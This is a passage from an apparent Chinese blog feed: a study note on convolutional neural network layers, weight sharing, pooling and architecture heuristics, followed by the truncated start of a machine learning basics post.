    <title>卷积神经网络CNN入门</title>
    <link href="http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://ggb0n.cool/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-08T16:16:23.000Z</published>
    <updated>2020-04-22T00:20:39.285Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是记录一下对<code>卷积神经网络</code>（<code>CNN</code>）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。</p><p>CNN曾经被<code>AlphaGo</code>的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？<a id="more"></a><br>这可能让人无法回答，其实CNN虽然相对于<code>深度神经网络</code>（<code>DNN</code>）更加简便，效能也很好，不过CNN只是用于图像处理，或者具有与图像处理要素相当的一些问题的处理中，就比如<code>AlphaGo</code>的下围棋，其实就相当于把棋盘当做了图像来进行处理，因此，如果你需要利用神经网络实现某些项目，一定要考虑好它具备与图像处理相当的要素没有。</p><p>这里提供一个比较好的学习视频，是<a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">李宏毅老师的教学视频</a>。好了，下面进入学习记录了。</p><h3 id="卷积神经网络概述"><a href="#卷积神经网络概述" class="headerlink" title="卷积神经网络概述"></a>卷积神经网络概述</h3><p>卷积神经网络，是深度学习算法应用最成功的领域之一，卷积神经网络包括一维卷积神经网络，二维卷积神经网络以及三维卷积神经网络。一维卷积神经网络主要用于<code>序列类</code>的数据处理，二维卷积神经网络常应用于<code>图像类文本</code>的识别，三维卷积神经网络主要应用于<code>医学图像</code>以及<code>视频类</code>数据识别。</p><p>其结构模型如下：<br><img src="http://ggb0n.cool/images/moxing1.png" alt=""></p><p>与常规神经网络不同，卷积神经网络的各层中的神经元是<code>3维</code>排列的：<code>宽度</code>、<code>高度</code>和<code>深度</code>。其中的宽度和高度是很好理解的，因为本身卷积就是一个二维模板，但是在卷积神经网络中的深度指的是<strong>激活数据体</strong>的第三个维度，而不是整个网络的深度，整个网络的深度指的是网络的层数。</p><h3 id="卷积神经网络层次"><a href="#卷积神经网络层次" class="headerlink" title="卷积神经网络层次"></a>卷积神经网络层次</h3><p>卷积神经网络主要由这几类层构成：<code>输入层</code>、<code>卷积层</code>，<code>ReLU层</code>、<code>池化（Pooling）层</code>(有时也称降采样、下采样层)和<code>全连接层</code>（全连接层和常规神经网络中的一样）。通过将这些层叠加起来，就可以构建一个完整的卷积神经网络，如下图：</p><p><img src="http://ggb0n.cool/images/moxing2.png" alt=""></p><p>各层的主要作用如下：</p><ul><li>输入层：用于数据的输入；</li><li>卷积层：使用卷积核进行特征提取和特征映射；</li><li>池化层：进行下采样，对特征图稀疏处理，减少数据运算量；</li><li>激励层：由于卷积也是一种线性运算，因此需要增加非线性映射；</li><li>全连接层：通常在CNN的尾部进行重新拟合，减少特征信息的损失。</li></ul><h4 id="输入层"><a href="#输入层" class="headerlink" title="输入层"></a>输入层</h4><p>该层除了输入数据，还会对数据进行一些预处理，包括：<code>去均值</code>、<code>归一化</code>、<code>PCA</code>、<code>白化</code></p><blockquote><p>PCA：是指通过抛弃携带信息量较少的维度，保留主要的特征信J自，来对数据进行降维处理，思路上是使用少数几个有代表性、互不相关的特征来代替原先的..k量的、存在一定相关性的特征，从而加速机器学习进程。PCA可用于特征提取，数据压缩，去噪声，降维等操作。</p></blockquote><blockquote><p>白化：目的是去掉数据之间的相关联度和令方差均一化，由于图像中相邻像素之间具有很强的相关性，所以用于训练时很多输入是冗余的。这时候去相关的操作就可以采用自化操作，从而使得：</p><ul><li>1、减少特征之间的相关性</li><li>2、特征具有相同的方差</li></ul></blockquote><h4 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h4><p>卷积层是构建卷积神经网络的<strong>核心层</strong>，因此该层也是学习的重点。它产生了网络中大部分的<strong>计算量</strong>，注意是计算量而不是参数量。</p><p><strong>卷积层的作用</strong></p><p>主要有三点：</p><ul><li><p>滤波器的作用或者说是卷积的作用</p><blockquote><p>卷积层的参数是有一些可学习的<code>滤波器</code>（<code>Filter</code>）集合构成的。每个滤波器在空间上（宽度和高度）都比较小，<strong>但是深度和输入数据一致</strong>。<br>直观地来说，网络会让滤波器学习到当它看到某些类型的视觉特征时就激活，具体的视觉特征可能是某些方位上的边界，或者在第一层上某些颜色的斑点，甚至可以是网络更高层上的蜂巢状、车轮状的图案。</p></blockquote></li><li><p>可以看做神经元的一个输出</p><blockquote><p>神经元只观察输入数据中的一小部分，并且和空间上左右两边的所有神经元共享参数（因为这些数字都是使用同一个滤波器得到的结果）。</p></blockquote></li><li><p>减少参数数量</p><blockquote><p>这个由于卷积具有“<code>权值共享</code>”这样的特性，可以降低参数数量，达到降低计算开销，防止由于参数过多而造成过拟合。</p></blockquote></li></ul><p><strong>感受野</strong></p><p>在处理图像这样的高维度输入时，让每个神经元都与前一层中的所有神经元进行全连接是不现实的。而是让每个神经元只与输入数据的一个局部区域连接，该连接的空间大小叫做神经元的<code>感受野（receptive field）</code>，它的尺寸是一个超参数（滤波器的空间尺寸）。注意：在深度方向上，这个连接的大小总是和输入的深度相等。</p><p><strong>神经元的空间排列</strong></p><p>感受野讲解了卷积层中每个神经元与<strong>输入数据体</strong>之间的连接方式，但是尚未讨论输出数据体中神经元的数量，以及它们的排列方式。3个超参数控制着输出数据体的尺寸：<code>深度</code>（<code>depth</code>），<code>步长</code>（<code>stride</code>）和<code>零填充</code>（<code>zero-padding</code>）：</p><ul><li>深度：一个超参数，和使用的滤波器的数量一致，而每个滤波器在输入数据中寻找一些不同的东西，即图像的某些特征。</li><li>步长：在滑动滤波器的时候，必须指定步长。当步长为1，滤波器每次移动1个像素；当步长为2，滤波器滑动时每次移动2个像素，依次类推。这个操作会让输出数据体在空间上变小。</li><li>零填充：有时候将输入数据体用<code>0</code>在边缘处进行填充是很方便的。零填充的尺寸是一个超参数。它具有一个良好性质，即可以控制输出数据体的空间尺寸（最常用的是用来保持输入数据体在空间上的尺寸，使得输入和输出的宽高都相等）。</li></ul><p>输出数据体在空间上的尺寸 <code>W2*H2*D2</code>可以通过输入数据体尺寸<code>W1*H1*D1</code>、卷积层中神经元的感受野尺寸<code>F</code>、步长<code>S</code>、滤波器数量<code>K</code>和零填充的数量<code>P</code>计算输出出来：</p><p><img src="http://ggb0n.cool/images/size.jpg" alt=""></p><p>注意这些空间排列的超参数之间是相互限制的。举例说来，当输入尺寸<code>W=10</code>，不使用零填充<code>P=0</code>，滤波器尺寸 <code>F=3</code>，此时步长<code>S=2</code>是行不通，因为<code>(W-F+2P)/S+1=(10-3+0)/2+1=4.5</code>，结果不是整数，这就是说神经元不能整齐对称地滑过输入数据体。<br>因此，这些超参数的设定就被认为是无效的，一个卷积神经网络库可能会报出一个错误，通过修改零填充值、修改输入数据体尺寸，或者其他什么措施来让设置合理。合理地设置网络的尺寸让所有的维度都能正常工作，是相当让人头痛的事，而使用零填充和遵守其他一些设计策略将会有效解决这个问题。</p><p><strong>权值共享</strong></p><p>在卷积层中<code>权值共享</code>是用来控制参数的数量。假如在一个卷积核中，每一个感受野采用的都是不同的权重值（卷积核的值不同），那么这样的网络中参数数量将是十分巨大的。</p><p>权值共享是基于这样的一个合理的假设：如果一个特征在计算某个空间位置<code>(x1,y1)(x1,y1)</code>的时候有用，那么它在计算另一个不同位置<code>(x2,y2)(x2,y2)</code>的时候也有用。基于这个假设，可以显著地减少参数数量。<br>换言之，就是将深度维度上一个单独的2维切片看做<code>深度切片</code>（<code>depth slice</code>），比如一个数据体尺寸为<code>[55x55x96]</code>的就有96个深度切片，每个尺寸为<code>[55x55]</code>，其中在每个深度切片上的结果都使用同样的权重和偏差获得的。<br>在这样的参数共享下，假如一个例子中的第一个卷积层有96个卷积核，那么就有96个不同的权重集了，一个权重集对应一个深度切片，如果卷积核的大小是<code>11x11</code>的，图像是RGB3通道的，那么就共有<code>96x11x11x3=34,848</code>个不同的权重，总共有<code>34,944</code>个参数（因为要+96个偏差），并且在每个深度切片中的<code>55x55</code>的结果使用的都是同样的参数。</p><p>在反向传播的时候，都要计算每个神经元对它的权重的梯度，但是需要把同一个深度切片上的所有神经元对权重的梯度累加，这样就得到了对共享权重的梯度。这样，每个切片只更新一个权重集。原理如下图：</p><p><img src="http://ggb0n.cool/images/CNN02.png" alt=""></p><p><img src="http://ggb0n.cool/images/CNN03.png" alt=""></p><p>如上两图所示，左侧的神经元是将每一个感受野展开为一列之后串联起来（就是展开排成一列，同一层神经元之间不连接）。右侧的<code>Deep1i</code>是深度为<code>1</code>的神经元的第<code>i</code>个，<code>Deep2i</code>是深度为<code>2</code>的神经元的第<code>i</code>个，同一个深度的神经元的权值都是相同的，黄色的都是相同的（上面4个与下面4个的参数相同），蓝色也都是相同的。</p><p>所以现在回过头来看上面说的卷积神经网络的反向传播公式对梯度进行累加求和也是基于这点考虑（同一深度的不同神经元共用一组参数，所以累加）；而每个切片只更新一个权重集的原因也是这样的，因为从图中可以看到，不同深度的神经元不会公用相同的权重，所以只能更新一个权重集。</p><blockquote><p>注意：如果在一个深度切片中的所有权重都使用同一个权重向量，那么卷积层的前向传播在每个深度切片中可以看做是在计算神经元权重和输入数据体的卷积（这就是“<code>卷积层</code>”名字由来）。这也是为什么总是将这些权重集合称为滤波器（或<code>卷积核</code>（<code>kernel</code>）），因为它们和输入进行了卷积。</p></blockquote><blockquote><p>注意：有时候参数共享假设可能没有意义，特别是当卷积神经网络的输入图像是一些明确的中心结构时候。这时候我们就应该期望在图片的不同位置学习到完全不同的特征（而一个卷积核滑动地与图像做卷积都是在学习相同的特征）。一个具体的例子就是输入图像是人脸，人脸一般都处于图片中心，而我们期望在不同的位置学习到不同的特征，比如眼睛特征或者头发特征可能（也应该）会在图片的不同位置被学习。在这个例子中，通常就放松参数共享的限制，将层称为局部连接层（<code>Locally-Connected Layer</code>）。</p></blockquote><p><strong>卷积层的超参数及选择</strong></p><p>由于参数共享，每个滤波器包含<code>F*F*D1</code>个权重，卷积层一共有<code>F*F*D1*K</code>个权重和<code>K</code>个偏移。在输出数据体中，第<code>d</code>个深度切片（空间尺寸是<code>W2*H2</code>），用第<code>d</code>个滤波器和输入数据进行有效卷积运算的结果（使用步长<code>S</code>），最后在加上第<code>d</code>个偏差。</p><p>对这些超参数，常见的设置是<code>F=3</code>，<code>S=1</code>，<code>P=1</code>，<code>F=3</code>，<code>S=1</code>，<code>P=1</code>。</p><p><strong>卷积层演示</strong></p><p>因为3D数据难以可视化，所以所有的数据（<code>输入数据体是蓝色</code>，<code>权重数据体是红色</code>，<code>输出数据体是绿色</code>）都采取将深度切片按照列的方式排列展现。输入数据体的尺寸是<code>W1=5</code>，<code>H1=5</code>，<code>D1=3</code>，<code>W1=5</code>，<code>H1=5</code>，<code>D1=3</code>，卷积层参数<code>K=2</code>，<code>F=3</code>，<code>S=2</code>，<code>P=1</code>，<code>K=2</code>，<code>F=3</code>，<code>S=2</code>，<code>P=1</code>。就是说，有<code>2</code>个滤波器，滤波器的尺寸是<code>3*33*3</code>，它们的步长是<code>2</code>。因此，输出数据体的空间尺寸是<code>(5−3+2)/2+1=3(5−3+2)/2+1=3</code>。注意输入数据体使用了零填充<code>P=1</code>，所以输入数据体外边缘一圈都是<code>0</code>。<br>下面的例子在绿色的输出激活数据上循环演示，展示了其中每个元素都是先通过蓝色的输入数据和红色的滤波器逐元素相乘，然后求其总和，最后加上偏差得来。<br><img src="http://ggb0n.cool/images/juanji.jpg" alt=""></p><p><strong>卷积操作形式</strong></p><p>卷积操作的形式比较多，这里主要介绍三点：<code>矩阵乘法实现卷积</code>、<code>1*1卷积</code>、<code>扩张卷积</code>。</p><ul><li>用矩阵乘法实现卷积</li></ul><blockquote><p>卷积运算本质上就是在滤波器和输入数据的局部区域间做点积。卷积层的常用实现方式就是利用这一点，将卷积层的前向传播变成一个巨大的矩阵乘法。</p><p>(1) 输入图像的局部区域被<code>im2coim2col</code>操作拉伸为列。比如输入是<code>[227x227x3]</code>，要与尺寸为<code>11x11x3</code>的滤波器以步长为<code>4</code>进行卷积，就依次取输入中的<code>[11x11x3]</code>数据块，然后将其拉伸为长度为<code>11x11x3=363</code>的列向量。重复进行这一过程，因为步长为<code>4</code> ，所以经过卷积后的宽和高均为<code>(227-11)/4+1=55</code>，共有<code>55x55=3,025</code>个神经元。因为每一个神经元实际上都是对应有<code>363</code>的列向量构成的感受野，即一共要从输入上取出<code>3025</code>个<code>363</code>维的列向量。所以经过<code>im2col</code>操作得到的输出矩阵的尺寸是<code>[363x3025]</code>，其中每列是拉伸的感受野。注意因为感受野之间有重叠，所以输入数据体中的数字在不同的列中可能有重复。</p><p>(2) 卷积层的权重也同样被拉伸成行。举例：如果有96个尺寸为<code>[11x11x3]</code>的滤波器，就生成一个矩阵，尺寸为<code>[96x363]</code>。</p><p>(3) 现在卷积的结果和进行一个大矩阵乘法<code>np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)</code>是等价的了，能得到每个滤波器和每个感受野间的点积。在我们的例子中，这个操作的输出是<code>[96x3025]</code>，给出了每个滤波器在每个位置的点积输出。注意其中的<code>np.dotnp.dot</code>计算的是矩阵乘法而不是点积。</p><p>(4) 结果最后必须被重新变为合理的输出尺寸<code>[55x55x96]</code>。</p></blockquote><p>这个方法的缺点就是占用内存太多，因为在输入数据体中的某些值在<code>XcolXcol</code>中被复制了多次；优点在于矩阵乘法有非常多的高效底层实现方式。</p><ul><li>1*1卷积</li></ul><p>具有信号处理专业知识的人刚开始看见这个<code>1*1卷积</code>的时候可能会比较困惑，因为信号是<code>2</code>维的，所以<code>1*1卷积</code>就没有意义。但是，在卷积神经网络中不是这样，因为这里是对<code>3</code>个维度进行操作，滤波器和输入数据体的深度是一样的。比如，如果输入是<code>[32x32x3]</code>，那么<code>1*1卷积</code>就是在高效地进行<code>3</code>维<code>点积</code>（因为输入深度是3个通道）；另外的一种想法是将这种卷积的结果看作是全连接层的一种实现方式，后面讲到全连接层会提到。</p><ul><li>扩张卷积</li></ul><p>我们前面提到的滤波器都是连续的，但是，让滤波器中元素之间有间隙也是可以的，这就叫做扩张，如图：</p><p><img src="http://ggb0n.cool/images/kuozhang.jpg" alt=""></p><p>在某些设置中，扩张卷积与正常卷积结合起来非常有用，因为这可以在很少的层数内更快地汇集输入图片的大尺度特征。比如，如果上下重叠<code>2</code>个<code>3*3</code>的卷积层，那么第二个卷积层的神经元的感受野是输入数据体中<code>5*5</code>的区域（可以称这些神经元的有效感受野是5*5）。如果我们对卷积进行扩张，那么这个有效感受野就会迅速增长。</p><p>至此，对卷积层的学习告一段落，下一层是池化层。</p><h4 id="ReLU层"><a href="#ReLU层" class="headerlink" title="ReLU层"></a>ReLU层</h4><p>也称线性整流层（<code>Rectified Linear Units layer, ReLU layer</code>），使用<a href="https://zh.wikipedia.org/wiki/线性整流函数">线性整流函数</a>（<code>Rectified Linear Units, ReLU</code>）<code>f(x)=max(0,x)</code>作为这一层神经的激励函数（<code>Activation function</code>）。它可以增强判定函数和整个神经网络的非线性特性，而本身并不会改变卷积层。</p><p>事实上，其他的一些函数也可以用于增强网络的非线性特性，如<a href="https://zh.wikipedia.org/wiki/双曲正切函数">双曲正切函数</a> <code>f(x)=tanh(x)</code>、<code>f(x)=|tanh(x)|</code>，或者<a href="https://zh.wikipedia.org/wiki/S函数">Sigmoid函数</a><code>f(x)=(1+e^(-x))^(-1)</code>。相比其它函数来说，ReLU函数更受青睐，这是因为它可以将神经网络的训练速度提升数倍，而并不会对模型的泛化准确度造成显著影响。</p><h4 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h4><p>通常在连续的卷积层之间会周期性地插入一个<code>池化层</code>（<code>Pooling</code>），它的作用是逐渐降低数据体的空间尺寸，这样的话就能减少网络中参数的数量，使得计算资源耗费变少，也能有效控制过拟合。如下图：</p><p><img src="http://ggb0n.cool/images/pooling.png" alt=""></p><p>池化层使用<code>MAX</code>操作，对输入数据体的每一个深度切片独立进行操作，改变它的空间尺寸。最常见的形式是使用尺寸<code>2*2</code>的滤波器，以步长为<code>2</code>来对每个深度切片进行降采样，将其中<code>75%</code>的激活信息都丢掉。每个<code>MAX</code>操作是从<code>4</code>个数字中取最大值（也就是在深度切片中某个<code>2*2</code>的区域），深度保持不变。</p><p>池化层的计算：输入数据体尺寸<code>W1*H1*D1</code>，有两个超参数：空间大小<code>F</code>和步长<code>S</code>；输出数据体的尺寸<code>W2*H2*D2</code>，其中：</p><p><img src="http://ggb0n.cool/images/poolingcalc.jpg" alt=""></p><p>这里面与之前的卷积的尺寸计算的区别主要在于两点：首先在池化的过程中基本不会进行另补充；其次池化前后深度不变。</p><p><strong>普通池化（General Pooling）</strong>：除了常用的最大池化，池化单元还可以使用其他的函数，比如<code>平均池化</code>（<code>average pooling</code>）或<code>L-2范式池化</code>（<code>L2-norm pooling</code>）。平均池化历史上比较常用，但是现在已经很少使用了。因为实践证明，最大池化的效果比平均池化要好。</p><p><strong>反向传播</strong>：回顾一下反向传播的内容，其中<code>max(x,y)</code>函数的反向传播可以简单理解为将梯度只沿最大的数回传。因此，在向前传播经过汇聚层的时候，通常会把池中最大元素的索引记录下来（有时这个也叫作<code>道岔</code>（<code>switches</code>）），这样在反向传播的时候梯度的路由就很高效。</p><p><strong>不使用池化层</strong>：有些时候，被当做图像处理的问题其实也并不完全等同于图像处理，比如AlphaGo的下围棋：棋盘是不能摘除一部分位置进行缩小的，因此也就不能进行池化，事实上AlphaGo也并没有采用池化层。<br>通过在卷积层中使用更大的步长来降低数据体的尺寸。有发现认为有时候，在训练一个良好的生成模型时，弃用汇聚层也是很重要的。比如<code>变化自编码器</code>（<code>VAEs：variational autoencoders</code>）和<code>生成性对抗网络</code>（<code>GANs：generative adversarial networks</code>）。未来的卷积网络结构中，池化层的发展还真不能确定。</p><h4 id="全连接层"><a href="#全连接层" class="headerlink" title="全连接层"></a>全连接层</h4><p>全连接层（简称<code>FC</code>）将每一个结点都与上一层的所有结点相连，用来把前边提取到的特征综合起来。全连接层可以整合卷积层或者池化层中具有类别区分性的局部信息。</p><p>为了提升 CNN 网络性能，全连接层每个神经元的激励函数一般采用ReLU函数。最后一层全连接层的输出值被传递给一个输出，可以采用<code>softmax</code>逻辑回归（<code>softmax regression</code>）进行分类，该层也可称为<code>softmax</code>层（<code>softmax laye</code>）。</p><p><strong>将卷积层转化为全连接层</strong></p><p>对于任一个卷积层，都存在一个能实现和它一样的前向传播函数的全连接层。该全连接层的权重是一个巨大的矩阵，除了某些特定块（感受野），其余部分都是<code>0</code>；而在非<code>0</code>部分中，大部分元素都是相等的（权值共享）。<br>如果把全连接层转化成卷积层，以输出层的<code>Deep11</code>为例，与它有关的输入神经元只有上面四个，所以在权重矩阵中与它相乘的元素，除了它所对应的<code>4</code>个，剩下的均为<code>0</code>，这也就解释了为什么权重矩阵中有为零的部分。<br>另外要把“<code>将全连接层转化成卷积层</code>”和“<code>用矩阵乘法实现卷积</code>”区别开，这两者是不同的，后者本身还是在计算卷积，只不过将其展开为矩阵相乘的形式，并不是”将全连接层转化成卷积层”，所以除非权重中本身有零，否则用矩阵乘法实现卷积的过程中不会出现值为<code>0</code>的权重。</p><p><strong>将全连接层转化为卷积层</strong></p><p>任何全连接层都可以被转化为卷积层。比如，一个<code>K=409</code>6的全连接层，输入数据体的尺寸是 <code>7*7*5127*7*512</code>，这个全连接层可以被等效地看做一个<code>F=7</code>，<code>P=0</code>，<code>S=1</code>，<code>K=4096</code>，<code>F=7</code>，<code>P=0</code>，<code>S=1</code>，<code>K=4096</code>的卷积层。换句话说，就是将滤波器的尺寸设置为和输入数据体的尺寸设为一致的。因为只有一个单独的深度列覆盖并滑过输入数据体，所以输出将变成<code>1*1*40961*1*4096</code>，这个结果就和使用初始的那个全连接层一样了。<br>这个实际上也很好理解，因为，对于其中的一个卷积滤波器，这个滤波器的的深度为<code>512</code>，也就是说，虽然这个卷积滤波器的输出只有<code>1</code>个，但是它的权重有<code>7*7*5127*7*512</code>，相当于卷积滤波器的输出为一个神经元，这个神经元与上一层的所有神经元相连接，而这样与前一层所有神经元相连接的神经元一共有<code>4096</code>个，这不就是一个全连接网络。</p><p>在上述的两种变换中，<code>将全连接层转化为卷积层</code>在实际运用中更加有用。假设一个卷积神经网络的输入是<code>224*224*3</code>的图像，一系列的卷积层和汇聚层将图像数据变为尺寸为<code>7*7*512</code>的激活数据体（在AlexNet中就是这样，通过使用5个汇聚层来对输入数据进行空间上的降采样，每次尺寸下降一半，所以最终空间尺寸为<em>224/2/2/2/2/2=7</em>）。从这里可以看到，AlexNet使用了两个尺寸为<code>4096</code>的全连接层，最后一个有<code>1000</code>个神经元的全连接层用于计算分类评分。我们可以将这3个全连接转化为3个卷积层：</p><blockquote><p>(1) 针对第一个连接区域是<code>[7x7x512]</code>的全连接层，令其滤波器尺寸为<code>F=7</code>，这样输出数据体就为<code>[1x1x4096]</code>了。</p><p>(2) 针对第二个全连接层，令其滤波器尺寸为<code>F=1</code>，这样输出数据体为<code>[1x1x4096]</code>。</p><p>(3) 对最后一个全连接层也做类似的，令其<code>F=1</code>，最终输出为<code>[1x1x1000]</code>。</p></blockquote><p>这样做的目的是让卷积网络在一张更大的输入图片上滑动，得到多个输出，这样的转化可以让我们在单个向前传播的过程中完成上述的操作。</p><p>至此，对CNN各层的学习暂时告一段落，最起码有了一定的了解。下面将对各层之间的结构进行学习。</p><h3 id="卷积神经网络结构特点"><a href="#卷积神经网络结构特点" class="headerlink" title="卷积神经网络结构特点"></a>卷积神经网络结构特点</h3><p>卷积神经网络通常是由三种层构成：卷积层，池化层（除非特别说明，一般就是最大值池化）和全连接层。ReLU层通常在卷积层之后，它逐元素地进行激活函数操作，常常将它与卷积层看作是同一层。</p><h4 id="层的排列规律"><a href="#层的排列规律" class="headerlink" title="层的排列规律"></a>层的排列规律</h4><p>卷积神经网络最常见的形式就是将一些卷积层和ReLU层放在一起，其后紧跟池化层，然后重复如此直到图像在空间上被缩小到一个足够小的尺寸，在某个地方过渡成成全连接层也较为常见。最后的全连接层得到输出，比如分类评分等。换句话说，最常见的卷积神经网络结构如下：</p><p><img src="http://ggb0n.cool/images/pailie.jpg" alt=""></p><p>其中<code>*</code>指的是重复次数，<code>POOL?</code>指的是一个可选的池化层。其中<code>N&gt;=0</code>,通常<code>N&lt;=3</code>，<code>M&gt;=0</code>，<code>K&gt;=0</code>，<code>K&lt;3</code>。例如，下面是一些常见的网络结构规律：</p><ul><li><strong>INPUT -&gt; FC</strong> ：实现一个线性分类器，此处<code>N = M = K = 0</code>；</li><li><strong>INPUT -&gt; CONV -&gt; RELU -&gt; FC</strong>：单层的卷积神经网络；</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FC</strong>：此处在每个汇聚层之间有一个卷积层，这种网络就是简单的多层的卷积神经网络；</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FC</strong>：此处每个汇聚层前有两个卷积层，这个思路适用于更大更深的网络，因为在执行具有破坏性的汇聚操作前，多重的卷积层可以从输入数据中学习到更多的复杂特征。</li></ul><h4 id="卷积层的大小选择"><a href="#卷积层的大小选择" class="headerlink" title="卷积层的大小选择"></a>卷积层的大小选择</h4><p><strong>几个小滤波器卷积层的组合比一个大滤波器卷积层好</strong>。假设你一层一层地重叠了<code>3</code>个<code>3*3</code>的卷积层（层与层之间有ReLU激活函数）。在这个排列下，第一个卷积层中的每个神经元都对输入数据体有一个<code>3*3</code>的视野。第二个卷积层上的神经元对第一个卷积层有一个<code>3*3</code>的视野，也就是对输入数据体有<code>5*5</code>的视野。同样，在第三个卷积层上的神经元对第二个卷积层有<code>3*3</code>的视野，也就是对输入数据体有<code>7*7</code>的视野。</p><p>假设不采用这<code>3</code>个<code>3*3</code>的卷积层，而是使用一个单独的有<code>7*7</code>的感受野的卷积层，那么所有神经元的感受野也是<code>7*7</code>。多个卷积层与非线性的激活层交替的结构，比单一卷积层的结构更能提取出深层的更好的特征。但是也会有一些缺点，假设所有的数据有<code>C</code>个通道，那么单独的<code>7*7</code>卷积层将会包含<code>C*(7*7*C)=49C^2</code>个参数，而<code>3</code>个<code>3*3</code>的卷积层的组合仅有<code>3*(C*(3*3*C))=27C^2</code>个参数</p><p>直观说来，最好选择带有小滤波器的卷积层组合，而不是用一个带有大的滤波器的卷积层。前者可以表达出输入数据中更多个强力特征，使用的参数也更少。唯一的不足是，在进行反向传播时，中间的卷积层可能会导致占用更多的内存。</p><h4 id="层的尺寸设置"><a href="#层的尺寸设置" class="headerlink" title="层的尺寸设置"></a>层的尺寸设置</h4><p>各层常见的尺寸设置如下：</p><ul><li><strong>输入层</strong>：应该能被<code>2</code>整除很多次。常用数字包括<code>32</code>，<code>64</code>，<code>96</code>或<code>224</code>（比如ImageNet卷积神经网络），<code>384</code>和<code>512</code>。</li><li><strong>卷积层</strong>：应该使用小尺寸滤波器（比如<code>3*3</code>或最多<code>5*5</code>），使用步长<code>S=1</code>。还有一点非常重要，就是对输入数据进行<code>零填充</code>，这样卷积层就不会改变输入数据在空间维度上的尺寸。比如，当<code>F=3</code>，那就使用<code>P=1</code>来保持输入尺寸。当<code>F=5</code>，<code>P=2</code>，一般对于任意<code>F</code>，当<code>P=(F-1)/2</code>的时候能保持输入尺寸。如果必须使用更大的滤波器尺寸（比如<code>7*7</code>之类），通常只用在第一个面对原始图像的卷积层上。</li><li><strong>池化层</strong>：负责对输入数据的空间维度进行降采样。最常用的设置是用<code>2*2</code>感受野（即<code>F=2</code>）的最大值池化，步长为<code>S=2</code>。注意这一操作将会把输入数据中<code>75%</code>的激活数据丢弃（因为对宽度和高度都进行了<code>2</code>的下采样）。<br>另一个不那么常用的设置是使用<code>3*3</code>的感受野，步长为<code>2</code>。最大值池化的感受野尺寸很少有超过<code>3</code>的，因为池化操作过度，易造成数据信息丢失，这通常会导致算法性能变差。</li></ul><p>至此，对卷积神经网络的学习到此告一段落，很多深层次的地方其实还没搞懂，在以后的实践中再加深学习吧。</p><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/37261854">卷积神经网络入门详解</a><br><a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">李宏毅机器学习教学视频</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要是记录一下对&lt;code&gt;卷积神经网络&lt;/code&gt;（&lt;code&gt;CNN&lt;/code&gt;）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。&lt;/p&gt;
&lt;p&gt;CNN曾经被&lt;code&gt;AlphaGo&lt;/code&gt;的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？
    
    </summary>
    
    
      <category term="机器学习" scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>机器学习基本知识</title>
    <link href="http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <id>http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</id>
    <published>2020-04-08T16:03:30.000Z</published>
    <updated>2020-04-22T00:16:45.002Z</updated>
    
    <content type="html"><![CDATA[<p>最近由于一些需要在学习机器学习，B站上找了<a href="https://www.bilibili.com/video/av59606777">一个系列</a>的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。<a id="more"></a></p><h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p><code>机器学习（Machine Learning, ML）</code>是多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或者技能，重新组织已有的知识结构使之不断改善自身的性能。<br>机器学习是<code>人工智能</code>的核心，是使计算机具有智能的根本途径，其应用遍及人工智能的各个领域，主要使用归纳、综合而不是演绎。机器学习、机器学习，那么这里的学习到底指什么样的一个过程呢？</p><blockquote><p>学习：针对经验<code>E</code>和一系列任务<code>T</code>以及一定表现的衡量<code>P</code>，如果随之经验<code>E</code>的积累，针对定义好的任务<code>T</code>可以提高表现<code>P</code>，就说明计算机具有学习能力。 </p></blockquote><p>机器学习被这样定义：探究和开发一系列算法来如何使计算机不需要通过外部明显地知识，而可以通过数据进行学习、建模，并且利用建立的模型对新输入的数据进行预测的学科。</p><p>当今，机器学习已经广为，现在常见并且火热的应用如下：</p><ul><li>语音识别</li><li>自动驾驶</li><li>语言翻译</li><li>计算机视觉</li><li>推荐系统</li><li>无人机</li><li>垃圾邮件识别</li></ul><h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" 